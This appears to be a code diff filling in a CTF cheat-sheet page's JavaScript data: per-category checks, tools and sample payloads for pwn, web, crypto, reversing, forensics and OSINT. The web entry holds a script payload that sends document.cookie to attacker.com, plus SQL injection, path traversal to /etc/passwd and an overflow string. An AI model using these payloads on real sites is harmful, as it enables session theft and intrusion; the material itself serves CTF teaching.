@@ -195,59 +195,108 @@
 const entries = [
   {
     term: "Pwn",
-    tags: ["pwn"],
-    what: "Initial asset discovery and surface mapping.",
-    checks: ["Check robots.txt, sitemap.xml","Enumerate dirs/files","Identify tech stack"],
-    payloads: ["N/A (methodology)"],
-    tools: ["curl","httpx","ffuf","nmap"],
-    notes: "Save everything for later."
+    tags: ["pwn", "binary", "exploit"],
+    what: "Exploiting memory corruption bugs (buffer overflows, format strings, use-after-free, etc.) in binaries to gain code execution.",
+    checks: [
+      "Check protections: `checksec --file binary`",
+      "Run under GDB: `gdb ./binary` and test input",
+      "Look for `gets()`, `scanf()`, or `strcpy()` calls",
+      "Use `strings` and `objdump -d` to identify functions"
+    ],
+    payloads: [
+      "python3 -c 'print(\"A\"*72 + \"\\xef\\xbe\\xad\\xde\")'",
+      "ROP chain generation via pwntools"
+    ],
+    tools: ["pwntools", "gdb", "gef", "radare2", "ROPgadget"],
+    notes: "Focus on understanding stack layout and offsets; leverage libc leaks or ret2win functions."
   },
   {
     term: "Web",
-    tags: ["web"],
-    what: "Finding vulnerabilities in the found services.",
-    checks: ["., .","./.","."],
-    payloads: ["N/A (methodology)"],
-    tools: [".",".",".","."],
-    notes: "Enumeration"
+    tags: ["web", "xss", "sql", "csrf", "lfi", "rce"],
+    what: "Discover and exploit vulnerabilities in web applications, often via injection, misconfigurations, or logic flaws.",
+    checks: [
+      "Inspect source and JS files",
+      "Test parameters for XSS: `<script>alert(1)</script>`",
+      "Test for SQLi: `' OR '1'='1`",
+      "Check for directory traversal: `../../../../etc/passwd`",
+      "Check hidden endpoints via `gobuster dir`"
+    ],
+    payloads: [
+      "<script>fetch('http://attacker.com?cookie='+document.cookie)</script>",
+      "' UNION SELECT null, username, password FROM users -- ",
+      "{{7*7}}  (for SSTI)"
+    ],
+    tools: ["Burp Suite", "ffuf", "gobuster", "sqlmap", "wfuzz"],
+    notes: "Always map the entire site first. Test each input, header, and cookie individually."
   },
   {
     term: "Cryptography",
-    tags: ["crypto"],
-    what: "Using vulnerabilities to gain information/credentials about a system.",
-    checks: ["., .","./.","."],
-    payloads: ["N/A (methodology)"],
-    tools: [".",".",".","."],
-    notes: "Exploitation"
+    tags: ["crypto", "hash", "rsa", "aes"],
+    what: "Attacking weak or misused encryption schemes in challenges (RSA, XOR, substitution, etc.).",
+    checks: [
+      "Identify cipher type: substitution, XOR, base encodings, etc.",
+      "Analyze key sizes and randomness",
+      "Look for reused nonces or keys",
+      "Compare ciphertexts for repeating patterns"
+    ],
+    payloads: [
+      "python3 -c 'print(bytes([a^b for a,b in zip(ct1,ct2)]))'",
+      "openssl rsa -in key.pem -text -noout"
+    ],
+    tools: ["CyberChef", "RsaCtfTool", "hashcat", "John the Ripper"],
+    notes: "Always check for hints like repeated ciphertext blocks (ECB mode)."
   },
   {
     term: "Reverse Engineering",
-    tags: ["reverse"],
-    what: "Using the credentials found to access a system.",
-    checks: ["., .","./.","."],
-    payloads: ["N/A (methodology)"],
-    tools: [".",".",".","."],
-    notes: "Initial Access"
+    tags: ["reverse", "decompilation", "analysis"],
+    what: "Understanding and reconstructing program logic by decompiling or disassembling binaries.",
+    checks: [
+      "Run `strings` and `file` on the binary",
+      "Load into Ghidra or IDA and read main()",
+      "Check for hardcoded flags or passwords",
+      "Watch for checksum comparisons"
+    ],
+    payloads: [
+      "Patch conditional jumps (`jne` → `je`)",
+      "Use `gdb` to set breakpoints on strcmp()"
+    ],
+    tools: ["Ghidra", "IDA Free", "Binary Ninja", "radare2", "cutter"],
+    notes: "Focus on input validation and comparison logic; often the flag is revealed or encoded within."
   },
   {
     term: "Forensics",
-    tags: ["forensics"],
-    what: "Escalating your priveleges to root access",
-    checks: ["., .","./.","."],
-    payloads: ["N/A (methodology)"],
-    tools: [".",".",".","."],
-    notes: "Initial Access"
+    tags: ["forensics", "memory", "network", "pcap"],
+    what: "Analyzing captured data (memory dumps, network traffic, disk images) to extract evidence or flags.",
+    checks: [
+      "Run `file` and `binwalk` on unknown files",
+      "Search for readable strings: `strings dump.bin | grep flag`",
+      "Use `volatility -f memdump.mem windows.pslist`",
+      "Inspect `.pcap` files in Wireshark"
+    ],
+    payloads: [
+      "grep -a 'flag{' *",
+      "volatility -f memdump.mem filescan | grep flag"
+    ],
+    tools: ["volatility", "autopsy", "Wireshark", "foremost", "binwalk"],
+    notes: "Keep your data immutable (read-only) and document every extraction step."
   },
   {
     term: "OSINT",
-    tags: ["osint"],
-    what: "Making backdoors to more easily access a system.",
-    checks: ["., .","./.","."],
-    payloads: ["N/A (methodology)"],
-    tools: [".",".",".","."],
-    notes: "Persistence"
-  },
-
+    tags: ["osint", "recon", "social"],
+    what: "Gathering publicly available information from the internet to find clues or credentials.",
+    checks: [
+      "Use Google dorking: `site:example.com filetype:pdf`",
+      "Check usernames on platforms with `maigret` or `sherlock`",
+      "Reverse image search on suspicious avatars",
+      "Inspect metadata: `exiftool image.jpg`"
+    ],
+    payloads: [
+      "https://crt.sh/?q=target.com",
+      "https://github.com/search?q=target.com"
+    ],
+    tools: ["theHarvester", "Recon-ng", "Maltego", "Sherlock", "exiftool"],
+    notes: "Small leaks often lead to credentials or infrastructure details; keep notes of everything you find."
+  }
 ];
 
 const list = document.getElementById('list');
